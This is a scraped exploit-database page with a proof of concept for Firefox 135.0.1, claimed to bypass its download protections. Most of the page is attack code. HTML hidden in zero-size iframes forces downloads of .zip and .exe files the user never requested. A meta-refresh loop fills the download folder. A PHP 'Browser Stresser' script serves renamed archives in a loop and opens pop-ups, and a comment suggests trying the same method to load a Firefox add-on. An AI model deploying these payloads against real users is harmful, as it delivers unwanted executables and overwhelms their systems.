---
title: Firefox 135.0.1 bypass Download protections (PoC)
url: https://cxsecurity.com/issue/WLB-2025020019
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-03-01
fetch_date: 2025-10-06T21:55:47.926723
---

# Firefox 135.0.1 bypass Download protections (PoC)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Firefox 135.0.1 bypass Download protections (PoC)** **2025.02.28**  Credit:  **[Emiliano](https://cxsecurity.com/author/Emiliano/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: Firefox 135.0.1 bypass Download protections (PoC)
# Date: 2025-02-28
# Exploit Author: Emiliano Febbi
# Vendor Homepage: https://www.mozilla.org/it/firefox/new/
# Software Link: https://www.mozilla.org/it/firefox/download/thanks/
# Version: 135.0.1
# Tested on: Windows 10
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
| \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* |
| How can we start a download without requesting it, how can this bug be used to clog up our default download folder, how to do it with PHP too. |
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Forced and stealthy browser download: (#All Tested on Firefox 135.0.1)
#############
# HTML-Code #
#############
example: @1
<iframe id="brw" title="single\_download" width="0" height="0" src="file.zip">
</iframe>
The formats tested are .rar, .zip, .exe etc.
The path of URL in IFRAME file can be modify with the full path (http://www.badsite.com/file.zip) it's optional.
Just include these few lines of code in an html or php page to allow the file to be downloaded automatically.
#############
# HTML-Code #
#############
example: @2
Filename = loop.html
<meta http-equiv="refresh" content="0; URL='loop.html'" />
<iframe id="brw" title="loop" width="0" height="0" src="file.zip">
</iframe>
In this case, unlike the first one, the downloads will go in a loop, if the tab is not closed
they will clog up your download folder in a very short time.
No protection will prevent mass downloads, being html code.
<!--For these few lines of code, downloads will always appear safe in front of the browser.-->
#############
# PHP-Code #
#############
This is a Stresser for browsers, but tested on Firefox
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
..............................................................................................................................................................
<html>
<head><title>Browser Stresser</title></head>
<body>
<?php
/\* launch me \*/
/\* ------------------------------------------------------- \*/
/\*| File zip need in name exploit\_ (ex. exploit\_brw.zip) |\*/
/\* ------------------------------------------------------- \*/
/\* nullsite.altervista.org \*/
$three = array(
"zip",
"null",
"fake", //can modify this array to try Load an Firefox addon (extension: .xpi)
);
foreach ($three as $threez) {
foreach (glob("./\*.$threez") as $file\_ext) {
$exploit = 'exploit\_';
if (strpos($file\_ext, $exploit) != false) {
$file\_ext2 = str\_replace("./", "", "$file\_ext");
echo "Zip File Loaded<br>";
};
};;
};;;
$exploit\_Fldf = array("exploit\_a293.zip", "exploit\_2223.zip", "exploit\_349i.zip", "exploit\_32j3.zip", "exploit\_9349.zip", "exploit\_93uk.zip",
"exploit\_3483.zip", "exploit\_93u3.zip", "exploit\_934i.zip", "exploit\_232c.zip", "exploit\_233c.zip", "exploit\_cjn3.zip");
$exploit\_Fld = array\_rand($exploit\_Fldf, 2);
foreach($exploit\_Fld as $exploit\_Fldr) {
rename("$file\_ext2", "$exploit\_Fldf[$exploit\_Fldr]");
};;;;
echo "$exploit\_Fldf[$exploit\_Fldr] <br>";
echo '<iframe id="brw" title="exploit\_download" width="0" height="0" src="'.$exploit\_Fldf[$exploit\_Fldr].'"> //can duplicate this line
</iframe>';
?>
<meta http-equiv="refresh" content="0;url=<?php echo $\_SERVER['PHP\_SELF']; ?>">
<body onload="window.open('<?php echo $\_SERVER['PHP\_SELF']; ?>','Stresser','width=30 0,height=100,top=100,left=100')">
</body>
</html>
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
..............................................................................................................................................................
EXPLICATION:
ok! this simple PHP code is not very effective for a stress test of the browser software probably there are checks on the page code by Firefox
against some lines of HTML that go unnoticed.
#IMPORTANT:
So it is possible to enhance it simply by modifying a few lines of code, or simply by using more archives together, the more files to download the greater
the mass of downloaded files, which however will be consumed during the procedure by the script.
It will have the same effect as the lines of html code.
<!--all this to bypass firefox protections on the origin of the downloaded material and on the verification of the quantity.-->

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025020019)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Sub...